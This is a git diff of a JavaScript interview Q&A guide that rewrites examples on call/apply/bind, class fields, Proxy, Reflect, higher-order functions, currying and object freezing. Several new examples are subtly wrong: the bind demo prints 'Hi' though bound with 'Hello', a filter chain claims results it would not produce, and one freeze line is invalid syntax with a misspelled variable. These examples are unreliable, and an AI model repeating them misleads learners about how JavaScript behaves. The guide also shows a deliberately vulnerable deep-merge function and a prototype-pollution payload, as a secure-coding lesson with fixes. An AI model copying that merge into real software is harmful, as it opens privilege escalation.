-  return `${symbol}${amount.toFixed(decimals)} (${this.currency})`;
+const person = { name: "Sahima Mutti" };
+
+function say(greeting) {
+  return `${greeting}, ${this.name}`;
 }
 
-const context = { currency: 'USD' };
-
-// .call() — spread args
-console.log(formatCurrency.call(context, 9.99, '€', 2));
-// '€9.99 (USD)'
-
-// .apply() — array of args (useful when args are already in an array)
-const args = [9.99, '£', 2];
-console.log(formatCurrency.apply(context, args));
-// '£9.99 (USD)'
-
-// .bind() — returns a new function, args can be partially applied
-const formatUSD = formatCurrency.bind(context, undefined, '$', 2);
-// Partial application: context + decimals fixed; amount still variable
-const formatEUR = formatCurrency.bind({ currency: 'EUR' });
-
-console.log(formatEUR(19.5, '€')); // '€19.50 (EUR)'
-
-// ── .bind() for partial application (currying-lite) ──────────────────────────
-function multiply(a, b) { return a * b; }
-const double = multiply.bind(null, 2); // `this` irrelevant, a=2 fixed
-console.log(double(5));  // 10
-console.log(double(7));  // 14
-
-// ── .apply() classic use case: spreading args into Math.max ──────────────────
-const numbers = [3, 1, 4, 1, 5, 9, 2, 6];
-console.log(Math.max.apply(null, numbers)); // 9
-// Modern equivalent (prefer this):
-console.log(Math.max(...numbers));          // 9
-
-// ── Bound this is permanent — .call on bound function is ignored ──────────────
-function showName() { return this.name; }
-const bound = showName.bind({ name: 'Alice' });
-console.log(bound.call({ name: 'Bob' })); // 'Alice' — bind wins
+// call — invokes immediately, args passed individually
+say.call(person, "Hi");    // Hi Sahima Mutti 
 ```
 
-**Real-World Use Case:**
+**2. Apply:** invokes the function and allows you to pass in arguments as an array.
 
-**`.bind()`** is used in Express.js to create pre-configured middleware factories — e.g., `router.use(authMiddleware.bind(null, { roles: ['admin'] }))` partially applies configuration without an extra wrapper function. **`.apply()`** was the classic way to forward `arguments` to another function before rest/spread existed — still found in legacy polyfill libraries. **`.call()`** is used in the `Object.prototype.toString.call(value)` pattern for reliable type detection (returns `"[object Array]"`, `"[object RegExp]"`, etc.) that works correctly even when `toString` is overridden on the object.
+**Example:**
+
+```js
+const person = { name: "Sahima Mutti" };
+
+function say(greeting) {
+  return `${greeting}, ${this.name}`;
+}
+
+// apply — invokes immediately, args passed as array
+say.apply(person, ["Hi"]);    // Hi Sahima Mutti 
+```
+
+**3. Bind:** returns a new function, allowing you to pass in a this array and any number of arguments.
+
+**Example:**
+
+```js
+const person = { name: "Sahima Mutti"};
+
+function say(greeting) {
+  return `${greeting}, ${this.name}`;
+}
+
+// bind — returns a NEW function, does not invoke immediately
+const sayPerson = say.bind(person, "Hello");
+
+sayPerson();    // Hi Sahima Mutti 
+```
+
+**&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-call-apply-bind-xwenyv?file=/src/index.js)**
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -9240,76 +9194,50 @@ console.log(bound.call({ name: 'Bob' })); // 'Alice' — bind wins
 
 ## Q. What is `this` inside class fields vs. class methods, and what is the performance trade-off?
 
-ES2022 class fields (instance properties declared with `=`) are initialised in the **constructor** for each instance. An arrow function class field (`method = () => {}`) creates a **new function object per instance**, with `this` permanently bound. A regular class method (`method() {}`) lives on the **prototype** — one function object shared across all instances, with `this` determined dynamically at the call site.
+Class fields (instance properties declared with `=`) are initialised in the **constructor** for each instance. An arrow function class field (`method = () => {}`) creates a **new function object per instance**, with `this` permanently bound. 
+
+A regular class method (`method() {}`) lives on the **prototype** — one function object shared across all instances, with `this` determined dynamically at the call site.
+
+**Example 01:**
 
 ```js
 class Button {
-  label = 'Click me'; // instance field — one per instance
+  label = 'Click me';
 
-  // Arrow class field — new function created per instance
-  // `this` is permanently bound to the instance
-  handleClickArrow = () => {
-    console.log(`Arrow: ${this.label}`);
-  };
+  // Arrow field: new function per instance, `this` always bound to instance
+  handleClickArrow = () => console.log(`Arrow: ${this.label}`);
 
-  // Prototype method — shared across all instances
-  // `this` depends on the call site
-  handleClickMethod() {
-    console.log(`Method: ${this.label}`);
-  }
+  // Prototype method: shared across all instances, `this` depends on call site
+  handleClickMethod() { console.log(`Method: ${this.label}`); }
 }
 
 const btn1 = new Button();
 const btn2 = new Button();
 
-// Prototype method — shared
-console.log(btn1.handleClickMethod === btn2.handleClickMethod); // true (same fn object)
+console.log(btn1.handleClickMethod === btn2.handleClickMethod); // true  — shared on prototype
+console.log(btn1.handleClickArrow  === btn2.handleClickArrow);  // false — new fn per instance
+```
 
-// Arrow field — not shared
-console.log(btn1.handleClickArrow === btn2.handleClickArrow);  // false (different fn objects)
+**Example 02:**
 
-// ── Performance implications ──────────────────────────────────────────────────
-// With 10,000 Button instances:
-// - handleClickMethod: 1 function in memory (on Button.prototype)
-// - handleClickArrow:  10,000 functions in memory (one per instance)
-// Arrow fields are 10,000× more memory-intensive for this use case
-
-// ── When to use arrow class fields ───────────────────────────────────────────
-// 1. Callbacks passed to event listeners / JSX props (this-binding safety)
-// 2. When you need consistent `this` in destructured usage
-// 3. When the extra memory cost is acceptable (small instance count)
-
-// ── When to use prototype methods ────────────────────────────────────────────
-// 1. High instance count (services, models, data structures)
-// 2. When method is never extracted from the instance
-// 3. When you override the method in subclasses (prototype chain works correctly)
-
-// ── Subclass behaviour difference ─────────────────────────────────────────────
+```js
+// Subclass behaviour
 class Base {
   value = 10;
-  arrowMethod = () => this.value * 2; // defined on instance, not overridable via prototype
+  arrowMethod = () => this.value * 2;
   protoMethod() { return this.value * 2; }
 }
 
 class Child extends Base {
   value = 20;
-
-  // This overrides the prototype method ✅
-  protoMethod() { return this.value * 3; }
-
-  // This does NOT override the arrow field — Base\'s arrow is already on the instance
-  // from `super()` call; Child\'s re-declaration creates a NEW instance field
-  arrowMethod = () => this.value * 3; // ✅ works, but it\'s a new field, not polymorphism
+  protoMethod() { return this.value * 3; } // overrides prototype method
+  arrowMethod = () => this.value * 3;      // creates a new instance field (not true override)
 }
 
 const child = new Child();
-console.log(child.protoMethod()); // 60 — Child\'s override ✅
-console.log(child.arrowMethod()); // 60 — Child\'s field ✅ (same result here, different mechanism)
+console.log(child.protoMethod()); // 60
+console.log(child.arrowMethod()); // 60
 ```
-
-**Real-World Use Case:**
-
-React class components defined event handlers as arrow class fields (`handleClick = () => this.setState(...)`) for `this` safety — but this caused a performance regression in large component trees where hundreds or thousands of list item components were rendered, each carrying its own separate function object for each handler. The React team documented this as a known overhead and it became one of the motivating factors for the hooks API (functional components), which stores handler functions on the hook\'s closure — created once per render, not per instance. Libraries like `react-window` (virtualised lists) are especially sensitive to this, carefully memoising callbacks with `useCallback` to avoid per-row function allocation.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -9799,12 +9727,29 @@ console.log(dtfMyNewLocale2.format(now2)); // 5/17/2022
 
 ## Q. How do you convert date to another timezone in javascript?
 
-The `.toLocaleString()` method to convert date in one timezone to another. 
+The `toLocaleString()` method to convert date in one timezone to another. 
 
-For example, let us convert current date to British English timezone as below,
+**Example 01:** Using `toLocaleString()`
 
 ```js
-console.log(event.toLocaleString('en-GB', { timeZone: 'UTC' })); //29/06/2019, 09:56:00
+const date = new Date();
+
+// Convert to a specific timezone
+console.log(date.toLocaleString('en-US', { timeZone: 'America/New_York' }));
+console.log(date.toLocaleString('en-GB', { timeZone: 'Europe/London' }));
+console.log(date.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }));
+```
+
+**Example 02:** Using `Intl.DateTimeFormat`
+
+```js
+const formatter = new Intl.DateTimeFormat('en-US', {
+  timeZone: 'America/New_York',
+  dateStyle: 'full',
+  timeStyle: 'short',
+});
+
+console.log(formatter.format(new Date())); // Sunday, May 18, 2026 at 10:30 AM
 ```
 
 <div align="right">
@@ -9816,6 +9761,29 @@ console.log(event.toLocaleString('en-GB', { timeZone: 'UTC' })); //29/06/2019, 0
 A mutable object is an object whose state can be modified after it is created. An immutable object is an object whose state cannot be modified after it is created.
 
 In JavaScript numbers, strings, null, undefined and Booleans are primitive types which are immutable. Objects, arrays, functions, classes, maps, and sets are mutable.
+
+**Example 01:**  Immutable (Primitives)
+
+```js
+let str = 'hello';
+str[0] = 'H';    // silently fails
+console.log(str); // 'hello' — unchanged
+
+let num = 42;
+num.foo = 'bar'; // silently discarded
+```
+
+**Example 02:**  Mutable (Objects and arrays)
+
+```js
+const person = { name: 'Alex' };
+person.name = 'John';   // mutates the original
+console.log(person);   // { name: 'John' }
+
+const arr = [10, 20, 30];
+arr.push(40);           // mutates in place
+console.log(arr);      // [10, 20, 30, 40]
+```
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -9936,6 +9904,8 @@ console.log(myCar.batteryLife); // 300
 3. If all its data properties are non-writable.
 The usage is going to be as follows,
 
+**Example:**
+
 ```js
 const object = {
   property: 'Welcome JS world'
@@ -10017,21 +9987,13 @@ A data structure in which data is stored as key value pairs. In an object the ke
 **Example:**
 
 ```js
-// Object() 
+const obj = { name: 'Alice', age: 30 };
 
-let obj = {};
+obj.city = 'Delhi';          // add property
+delete obj.age;              // remove property
 
-// adding properties to a object
-obj.prop = 10;
-obj[2] = 20;
-
-// getting nr of properties of the object
-Object.keys(obj).length; // 2
-
-// deleting a property
-delete obj[2];
-
-obj; // {prop: 10}
+console.log(Object.keys(obj).length); // 2
+console.log(obj);                     // { name: 'Alice', city: 'Delhi' }
 ```
 
 **2. ES6 Map:**
@@ -10041,30 +10003,19 @@ A data structure in which data is stored as key value pairs. In which **a unique
 **Example:**
 
 ```js
-// Map() 
-
 const myMap = new Map();
 
-const keyString = "a string",
-  keyObj = {},
-  keyFunc = function () {};
+const keyObj = {};
+const keyFunc = () => {};
 
-// setting the values
-myMap.set(keyString, "value associated with 'a string'");
-myMap.set(keyObj, "value associated with keyObj");
-myMap.set(keyFunc, "value associated with keyFunc");
+myMap.set('name', 'Alice');   // string key
+myMap.set(keyObj,  'object'); // object key
+myMap.set(keyFunc, 'func');   // function key
 
-myMap.size; // 3
-
-// getting the values
-myMap.get(keyString); // "value associated with 'a string'"
-myMap.get(keyObj); // "value associated with keyObj"
-myMap.get(keyFunc); // "value associated with keyFunc"
-
-myMap.get("a string"); // "value associated with 'a string'"
-// because keyString === 'a string'
-myMap.get({}); // undefined, because keyObj !== {}
-myMap.get(function () {}); // undefined, because keyFunc !== function () {}
+console.log(myMap.size);          // 3
+console.log(myMap.get('name'));    // 'Alice'
+console.log(myMap.get(keyObj));    // 'object'
+console.log(myMap.get({}));        // undefined — different reference
 ```
 
 **Key differences:**
@@ -10142,6 +10093,8 @@ console.log(newObj); // { a: 10, b: { c: 20 } }
 
 `structuredClone()` is a built-in global function that performs a deep clone of any serializable value. It supports objects, arrays, `Date`, `RegExp`, `Map`, `Set`, and more.
 
+**Example:**
+
 ```js
 const personalDetail = {
   name: 'Alex',
@@ -10163,6 +10116,8 @@ console.log(newObject.address.zip);      // '999999'
 ```
 
 **Manual recursive approach (for environments without `structuredClone`):**
+
+**Example:**
 
 ```js
 function deepClone(object) {
@@ -10302,8 +10257,13 @@ Object.entries(obj).length === 0 && obj.constructor === Object
 
 Many utility functions (deep merge, clone, set-by-path) use bracket-notation assignment with user-controlled keys. If the key is `__proto__`, `constructor`, or `prototype`, the attacker can modify `Object.prototype`.
 
+**Example:**
+
 ```js
-// Vulnerable deep merge
+/**
+ * Vulnerable deep merge
+ */
+
 function merge(target, source) {
   for (const key in source) {
     if (typeof source[key] === 'object') {
@@ -10323,7 +10283,7 @@ const user = {};
 console.log(user.isAdmin); // true  ← prototype polluted!
 ```
 
-**How to prevent it:**
+**Example:** How to prevent it
 
 ```js
 // 1. Use Object.create(null) for config/merge targets — no prototype to pollute
@@ -10371,7 +10331,7 @@ if (Object.hasOwn(user, 'isAdmin')) { ... }  // own property only
 
 ## Q. What is a proxy object?
 
-The `Proxy` object allows to create an object that can be used in place of the original object, but which may redefine fundamental `Object` operations like getting, setting, and defining properties. 
+The `Proxy` object allows to create an object that can be used in place of the original object, but which may redefine fundamental `Object` operations like getting, setting, and defining properties via **traps** defined in a handler.
 
 Proxy objects are commonly used to log property accesses, validate, format, or sanitize inputs, and so on. 
 
@@ -10386,52 +10346,51 @@ In this syntax:
 * **target**: is an object to wrap.
 * **handler**:  is an object that contains methods to control the behaviors of the `target`.
 
+**Common traps:**
+
+| Trap  | Intercepts |
+|-------|-----------|
+| `get` | Property read (`obj.prop`) |
+| `set` | Property write (`obj.prop = val`) |
+| `has` | `in` operator |
+| `deleteProperty` | `delete obj.prop` |
+| `apply` | Function call |
+
 **Example:**
 
 ```js
-// define an object called user
-const user = {
-  firstName: "Aniket",
-  lastName: "Narula",
-  email: "aniket.narula@email.com"
-};
+/**
+ * Proxy objects
+ */
+const person = { name: 'Alice', age: 25 };
 
-// define a handler object:
-const handler = {
-  get(target, property) {
-    console.log(`Property ${property} has been read.`);
-    return target[property];
+const proxy = new Proxy(person, {
+  get(target, key) {
+    return key in target ? target[key] : `Property "${key}" not found`;
+  },
+  set(target, key, value) {
+    if (key === 'age' && typeof value !== 'number') {
+      throw new TypeError('Age must be a number');
+    }
+    target[key] = value;
+    return true; // required — indicates success
   }
-};
+});
 
-// create a proxy object:
-const proxyUser = new Proxy(user, handler);
+console.log(proxy.name);   // 'Alice'
+console.log(proxy.email);  // 'Property "email" not found'
 
-console.log(proxyUser.firstName);
-console.log(proxyUser.lastName);
-
-// Output
-Property firstName has been read.
-Aniket
-Property lastName has been read.
-Narula
-
-user.firstName = 'Sonam';
-console.log(proxyUser.firstName);
-
-// Output
-Property firstName has been read.
-Sonam
+proxy.age = 30;            // ok
+proxy.age = 'old';         // TypeError: Age must be a number
 ```
 
-There are many real-world applications for Proxies
+**Real-world uses:**
 
-* Validation
-* Value correction
-* Property lookup extensions
-* Tracing property accesses
-* Revocable references
-* Implementing the DOM in javascript
+* **Validation** — enforce types/constraints before writing
+* **Reactive data** — Vue 3\'s reactivity system is built on Proxy
+* **Default values** — return fallbacks for missing properties
+* **Logging/debugging** — trace all property accesses
+* **Read-only views** — throw on any set attempt
 
 **&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-in-operator-3fxd3h?file=/src/index.js)**
 
@@ -10443,20 +10402,30 @@ There are many real-world applications for Proxies
 
 Reflection is defined as the ability of a program to inspect and modify its structure and behavior at runtime. `Reflect` is not a function object. `Reflect` helps with forwarding default operations from the handler to the target.
 
+`Reflect` methods are designed to be used inside `Proxy` handlers to forward the default behaviour after custom logic.
+
 **Example:**
 
 ```js
-// Math.max()
-let number = Reflect.apply(Math.max, Math, [10, 20, 30]);
-console.log(number); // 30
+/**
+ * Reflect
+ */
 
-// FromCharCode()
-let string = Reflect.apply(String.fromCharCode, undefined, [ 104, 101, 108, 108, 111]); // "hello"
-console.log(string); // "hello"
+const proxy = new Proxy({ count: 0 }, {
+  set(target, key, value) {
+    if (typeof value !== 'number') throw new TypeError('Numbers only');
+    console.log(`Setting ${key} = ${value}`);
+    return Reflect.set(target, key, value); // forward to default behaviour
+  },
+  get(target, key) {
+    console.log(`Reading ${key}`);
+    return Reflect.get(target, key); // forward to default behaviour
+  }
+});
 
-// RegExp()
-let index = Reflect.apply(RegExp.prototype.exec, /o/, ["Hello"]).index;
-console.log(index); // 4
+proxy.count = 5;       // Setting count = 5
+console.log(proxy.count); // Reading count → 5
+proxy.count = 'hello'; // TypeError: Numbers only
 ```
 
 **&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-reflection-nwgjhg?file=/src/index.js)**
@@ -10473,14 +10442,15 @@ You can use `new Date()` to generate a new Date object containing the current da
 
 ```js
 // Current Date
+const now = new Date();
 
-let today = new Date();
-let dd = String(today.getDate()).padStart(2, '0');
-let mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
-let yyyy = today.getFullYear();
+const day   = now.getDate();           // 18
+const month = now.getMonth() + 1;      // 5  (0-indexed)
+const year  = now.getFullYear();       // 2026
+const hours = now.getHours();          // 10
+const mins  = now.getMinutes();        // 30
 
-today = mm + '/' + dd + '/' + yyyy;
-document.write(today);
+console.log(`${day}/${month}/${year}`); // 18/5/2026
 ```
 
 **&#9885; [Try this example on CodeSandbox](https://codesandbox.io/s/js-date-nzwk0c?file=/src/index.js)**
@@ -10500,13 +10470,13 @@ const object = {
 };
 ```
 
-**a.) Using dot notation:** This solution is useful when you know the name of the property
+**1. Using dot notation:** This solution is useful when you know the name of the property
 
 ```js
 object.key3 = "value3";
 ```
 
-**b.) Using square bracket notation:** This solution is useful when the name of the property is dynamically determined.
+**2. Using square bracket notation:** This solution is useful when the name of the property is dynamically determined.
 
 ```js
 obj["key3"] = "value3";
@@ -10569,6 +10539,8 @@ _.isEqual(obj1, obj2); // true
 
 The `Object.entries()` method is used to return an array of a given object own enumerable string-keyed property [key, value] pairs, in the same order as that provided by a `for...in` loop. Let us see the functionality of object.entries() method in an example,
 
+**Example:**
+
 ```js
 const object = {
   a: 'Good morning',
@@ -10589,7 +10561,9 @@ for (let [key, value] of Object.entries(object)) {
 
 ## Q. What is the main difference between Object.values and Object.entries method?
 
-The `Object.values()` method\'s behavior is similar to `Object.entries()` method but it returns an array of values instead [key,value] pairs.
+The `Object.values()` method\'s behavior is similar to `Object.entries()` method but it returns an array of values instead `[key, value]` pairs.
+
+**Example:**
 
 ```js
 const object = {
@@ -10598,9 +10572,18 @@ const object = {
 };
 
 for (let value of Object.values(object)) {
-  console.log(`${value}`); // 'Good morning'
-                                100
+  console.log(`${value}`); 
 }
+// Output
+// Good morning 
+// 100
+
+for (let value of Object.entries(object)) {
+  console.log(`${value}`); 
+}
+// Output
+// a, Good morning 
+// b, 100
 ```
 
 <div align="right">
@@ -10611,6 +10594,8 @@ for (let value of Object.values(object)) {
 
 You can use `Object.keys()` method which is used return an array of a given object\'s own property names, in the same order as we get with a normal loop. For example, you can get the keys of a user object,
 
+**Example:**
+
 ```js
 const user = {
   name: 'John',
@@ -10618,7 +10603,7 @@ const user = {
   age: 40
 };
 
-console.log(Object.keys(user)); //['name', 'gender', 'age']
+console.log(Object.keys(user)); // ['name', 'gender', 'age']
 ```
 
 <div align="right">
@@ -10627,26 +10612,31 @@ console.log(Object.keys(user)); //['name', 'gender', 'age']
 
 ## Q. What is difference between array[] vs Object()?
 
-* `[]` is declaring an array.
-* `{}` is declaring an object.
+An **array** is a specialised object for ordered, numerically-indexed data. An **object** is for named key-value pairs.
 
-An array has all the features of an object with additional features (you can think of an array like a sub-class of an object) where additional methods and capabilities are added in the Array sub-class. In fact, typeof [] === "object" to further show you that an array is an object.
+| | `[]` Array | `{}` Object |
+|---|---|---|
+| Keys | Numeric indices (0, 1, 2…) | String / Symbol names |
+| Order | Guaranteed | Not guaranteed |
+| `.length` | Yes | No |
+| Iteration | `for...of`, `.forEach()` | `for...in`, `Object.keys()` |
+| `typeof` | `"object"` | `"object"` |
 
-The additional features consist of a magic `.length` property that keeps track of the number of items in the array and a whole slew of methods for operating on the array such as `.push()`, `.pop()`, `.slice()`, `.splice()`, etc... You can see a list of array methods here.
-
-An object gives you the ability to associate a property name with a value as in:
+**Example:**
 
 ```js
-var x = {};
-x.foo = 3;
-x["whatever"] = 10;
-console.log(x.foo);      // shows 3
-console.log(x.whatever); // shows 10
+const arr = ['a', 'b', 'c'];
+console.log(arr[0]);      // 'a'
+console.log(arr.length);  // 3
+console.log(typeof arr);  // 'object'
+console.log(Array.isArray(arr)); // true
+
+const obj = { name: 'Alice', age: 30 };
+console.log(obj.name);    // 'Alice'
+console.log(obj['age']);  // 30
 ```
 
-Object properties can be accessed either via the `x.foo` syntax or via the array-like syntax `x["foo"]`. The advantage of the latter syntax is that you can use a variable as the property name like `x[myvar]` and using the latter syntax, you can use property names that contain characters that Javascript won\'t allow in the `x.foo` syntax.
-
-An array is an object so it has all the same capabilities of an object plus a bunch of additional features for managing an **ordered**, **sequential** list of numbered indexes starting from `0` and going up to some length. Arrays are typically used for an ordered list of items that are accessed by numerical index. And, because the array is ordered, there are lots of useful features to manage the order of the list `.sort()` or to add or remove things from the list.
+Use an **array** when order matters and items are accessed by index. Use an **object** when items are accessed by a meaningful name.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -10771,47 +10761,36 @@ This is possible in JavaScript because functions are **first-class citizens** �
 | `filter(fn)` | Array of A | Array of A (≤ original length) | Select elements matching a predicate |
 | `reduce(fn, init)` | Array of A | Single value of any type | Accumulate/fold elements into one result |
 
+**Example:**
+
 ```js
-const orders = [
-  { id: 1, product: 'Widget',  price: 29.99, qty: 3, status: 'shipped'  },
-  { id: 2, product: 'Gadget',  price: 99.99, qty: 1, status: 'pending'  },
-  { id: 3, product: 'Doohickey', price: 9.99, qty: 5, status: 'shipped'  },
-  { id: 4, product: 'Thingamajig', price: 49.99, qty: 2, status: 'cancelled' },
+/**
+ * Higher-Order functions
+ */
+
+const items = [
+  { name: 'Apple',  price: 10, qty: 4 },
+  { name: 'Banana', price: 20, qty: 2 },
+  { name: 'Cherry', price: 30, qty: 1 },
 ];
 
-// map — transform: extract a line-item total for each order
-const lineTotals = orders.map(o => ({
-  id:    o.id,
-  total: +(o.price * o.qty).toFixed(2),
-}));
-// [{ id:1, total:89.97 }, { id:2, total:99.99 }, ...]
+// map — transform each element
+const totals = items.map(item => item.price * item.qty);
+// Output: [40, 40, 30]
 
-// filter — select: only shipped orders
-const shippedOrders = orders.filter(o => o.status === 'shipped');
-// [ { id:1, ... }, { id:3, ... } ]
+// filter — select matching elements
+const expensive = items.filter(item => item.price > 10);
+// Output: [{ name: 'Banana', ... }, { name: 'Cherry', ... }]
 
-// reduce — accumulate: revenue from shipped orders only
-const shippedRevenue = orders
-  .filter(o => o.status === 'shipped')
-  .map(o => o.price * o.qty)
-  .reduce((total, lineTotal) => total + lineTotal, 0);
+// reduce — accumulate into a single value
+const grandTotal = totals.reduce((sum, t) => sum + t, 0);
+//  Output: 110
 
-console.log(shippedRevenue.toFixed(2)); // '139.92'
-
-// reduce to group by status (reduce can build any data structure)
-const byStatus = orders.reduce((acc, order) => {
-  (acc[order.status] ??= []).push(order);
-  return acc;
-}, {});
-// { shipped: [...], pending: [...], cancelled: [...] }
-
-// Chained pipeline — readable, declarative
-const topShippedProducts = orders
-  .filter(o => o.status === 'shipped')
-  .map(o => ({ ...o, lineTotal: o.price * o.qty }))
-  .sort((a, b) => b.lineTotal - a.lineTotal)
-  .map(o => o.product);
-// ['Widget', 'Doohickey']
+// chained pipeline
+const result = items
+  .filter(item => item.price > 10)
+  .map(item => item.name);
+// Output: ['Apple', 'Cherry']
 ```
 
 **Real-World Use Case:**
@@ -10834,52 +10813,33 @@ Pure functions are the foundation of functional programming. They are:
 - **Safely parallelisable** — no shared state mutations.
 - **Composable** — output of one is safely passed as input to another.
 
+**Example 01:**
+
 ```js
-// ❌ Impure — depends on external state, has side effects
+/**
+ * Impure — depends on external state, has side effects
+ */
+
 let taxRate = 0.1;
 function calculateTotal(price) {
   console.log('Calculating...'); // side effect: I/O
   return price + price * taxRate; // depends on external variable
 }
 // calculateTotal(100) may return different results if taxRate changes
+```
 
-// ✅ Pure — same input always produces same output, no side effects
+**Example 02:**
+
+```js
+/**
+ * Pure — same input always produces same output, no side effects
+ */
+
 function calculateTotalPure(price, taxRate) {
   return price + price * taxRate;
 }
 console.log(calculateTotalPure(100, 0.1)); // always 110
 console.log(calculateTotalPure(100, 0.1)); // always 110
-
-// ❌ Impure — mutates argument
-function addItemMutating(cart, item) {
-  cart.items.push(item); // mutation ← side effect
-  return cart;
-}
-
-// ✅ Pure — returns new object, original untouched
-function addItemPure(cart, item) {
-  return { ...cart, items: [...cart.items, item] };
-}
-
-// ── Purity enables memoisation ───────────────────────────────────────────────
-function memoize(fn) {
-  const cache = new Map();
-  return function (...args) {
-    const key = JSON.stringify(args);
-    if (cache.has(key)) return cache.get(key);
-    const result = fn(...args);
-    cache.set(key, result);
-    return result;
-  };
-}
-
-const expensiveCalc = memoize((n) => {
-  // Simulate expensive computation
-  return Array.from({ length: n }, (_, i) => i).reduce((a, b) => a + b, 0);
-});
-
-console.log(expensiveCalc(1000)); // computed
-console.log(expensiveCalc(1000)); // cached — instant
 ```
 
 **Real-World Use Case:**
@@ -10899,6 +10859,8 @@ Redux reducers are **required to be pure functions** — `(state, action) => new
 
 Both require **unary functions** (single argument) for clean composition. Multi-argument functions must be curried first.
 
+**Example:**
+
 ```js
 // ── compose — right-to-left ───────────────────────────────────────────────────
 const compose = (...fns) => (x) => fns.reduceRight((acc, fn) => fn(acc), x);
@@ -10911,45 +10873,6 @@ const trim        = str => str.trim();
 const toLower     = str => str.toLowerCase();
 const removeSpaces = str => str.replace(/\s+/g, '-');
 const removeSpecial = str => str.replace(/[^a-z0-9-]/g, '');
-
-// slug generator — data flows left to right (pipe is more readable here)
-const slugify = pipe(trim, toLower, removeSpaces, removeSpecial);
-console.log(slugify('  Hello, World! 2024  ')); // 'hello-world-2024'
-
-// ── Currying enables multi-arg functions in pipelines ────────────────────────
-const curry = (fn) => {
-  const arity = fn.length;
-  return function curried(...args) {
-    return args.length >= arity
-      ? fn(...args)
-      : (...more) => curried(...args, ...more);
-  };
-};
-
-const add      = curry((a, b) => a + b);
-const multiply = curry((a, b) => a * b);
-const clamp    = curry((min, max, val) => Math.min(Math.max(val, min), max));
-
-const processScore = pipe(
-  multiply(10),   // 10x raw score
-  add(5),         // bonus points
-  clamp(0, 100),  // cap at 100
-  Math.round,
-);
-
-console.log(processScore(9));  // Math.round(clamp(0,100)(add(5)(multiply(10)(9)))) = 95
-console.log(processScore(11)); // 100 — clamped
-
-// ── Point-free style ─────────────────────────────────────────────────────────
-// 'Point-free' means the data argument is implicit — functions are composed
-// without mentioning the value they operate on
-const getActiveUserNames = pipe(
-  users => users.filter(u => u.active),
-  users => users.map(u => u.name),
-  names => names.sort(),
-);
-// vs explicit:
-// const getActiveUserNames = (users) => users.filter(...).map(...).sort();
 ```
 
 **Real-World Use Case:**
@@ -10971,12 +10894,24 @@ The distinction:
 - Partial application fixes `k` of `n` args at once, producing a function of `n-k` args (which can be > 1).
 - `.bind(null, arg1)` is partial application, not currying.
 
+**Example 01:**
+
 ```js
-// ── Manual currying ───────────────────────────────────────────────────────────
+/**
+ * Manual currying 
+ */
+
 const curriedAdd = a => b => c => a + b + c;
 console.log(curriedAdd(1)(2)(3)); // 6
+```
 
-// ── Generic curry utility ─────────────────────────────────────────────────────
+**Example 02:**
+
+```js
+/**
+ * Generic curry utility 
+ */
+
 const curry = (fn) => {
   const arity = fn.length;
   return function curried(...args) {
@@ -10990,34 +10925,6 @@ console.log(add3(1)(2)(3));   // 6
 console.log(add3(1, 2)(3));   // 6 — also valid (partial grouping)
 console.log(add3(1)(2, 3));   // 6
 console.log(add3(1, 2, 3));   // 6
-
-// ── Partial application via .bind() ──────────────────────────────────────────
-function log(level, timestamp, message) {
-  return `[${level}] ${timestamp}: ${message}`;
-}
-
-const warnNow = log.bind(null, 'WARN', new Date().toISOString());
-console.log(warnNow('Disk usage high')); // [WARN] 2026-05-12T...: Disk usage high
-// warnNow takes 1 arg, not 1-at-a-time — this is partial application
-
-// ── Practical: curried API request builder ────────────────────────────────────
-const request = curry(async (baseUrl, method, endpoint, body) => {
-  const res = await fetch(`${baseUrl}${endpoint}`, {
-    method,
-    headers: { 'Content-Type': 'application/json' },
-    body: body ? JSON.stringify(body) : undefined,
-  });
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
-  return res.json();
-});
-
-const api     = request('https://api.example.com');
-const apiGet  = api('GET');
-const apiPost = api('POST');
-
-// Now use like:
-// const user  = await apiGet('/users/1')();
-// const newUser = await apiPost('/users')({ name: 'Alice' });
 ```
 
 **Real-World Use Case:**
@@ -11034,14 +10941,19 @@ RxJS operators are curried/partially applied functions — `map(x => x * 2)` ret
 
 | Mechanism | Prevents new properties | Prevents property change | Prevents deletion | Deep? |
 |---|---|---|---|---|
-| `const` | ❌ (binding only) | ❌ | ❌ | ❌ |
-| `Object.freeze()` | ✅ | ✅ | ✅ | ❌ (shallow) |
-| `Object.seal()` | ✅ | ❌ | ✅ | ❌ |
-| `Object.preventExtensions()` | ✅ | ❌ | ❌ | ❌ |
-| Structural sharing (Immer/Immutable.js) | ✅ (by convention/proxy) | ✅ | ✅ | ✅ |
+| `const` | (binding only) | No | No | No |
+| `Object.freeze()` | Yes | Yes | Yes | No (shallow) |
+| `Object.seal()` | Yes | No | Yes | No |
+| `Object.preventExtensions()` | Yes | No | No | No |
+| Structural sharing (Immer/Immutable.js) | Yes (by convention/proxy) | Yes | Yes | Yes |
+
+**Example 01:**
 
 ```js
-// ── Object.freeze (shallow) ───────────────────────────────────────────────────
+/**
+ * Object.freeze (shallow)
+ */
+
 const config = Object.freeze({
   apiUrl: 'https://api.example.com',
   timeout: 5000,
@@ -11051,10 +10963,17 @@ const config = Object.freeze({
 config.timeout = 9999;       // silently fails (throws in strict mode)
 console.log(config.timeout); // 5000 — unchanged
 
-config.nested.retries = 99;  // ⚠️ succeeds — freeze is shallow!
+config.nested.retries = 99;  //  succeeds — freeze is shallow!
 console.log(config.nested.retries); // 99 — mutated!
+```
 
-// ── Deep freeze ──────────────────────────────────────────────────────────────
+**Example 02:**
+
+```js
+/**
+ * Deep freeze
+ */
+
 function deepFreeze(obj) {
   Object.getOwnPropertyNames(obj).forEach(name => {
     const value = obj[name];
@@ -11068,42 +10987,11 @@ const safeConfig = deepFreeze({
   nested: { retries: 3 },
 });
 samConfig?.nested.retries = 99; // fails silently / throws in strict mode
-
-// ── Immutable updates with spread (Redux pattern) ─────────────────────────────
-const state = { user: { name: 'Alice', score: 10 }, theme: 'dark' };
-
-// ❌ Mutation
-state.user.score = 20;
-
-// ✅ Immutable update — new object, original untouched
-const newState = {
-  ...state,
-  user: { ...state.user, score: 20 },
